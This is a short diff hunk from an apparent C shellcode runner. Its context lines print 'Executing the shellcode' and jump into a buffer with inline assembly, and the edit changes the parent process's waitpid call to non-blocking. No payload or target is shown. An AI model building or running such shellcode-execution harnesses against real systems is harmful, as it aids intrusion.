@@ -109,7 +109,7 @@ int main(int argc, char **argv) {
     printf("[*] Executing the shellcode..\n");
     __asm__ __volatile__("call *%%eax\r\n" : : "a"(pcall));
   } else {
-    waitpid(-1, &wstatus, 0);
+    waitpid(pid, &wstatus, WNOHANG);
   }
 
   printf("[*] Restoring register state..\n");
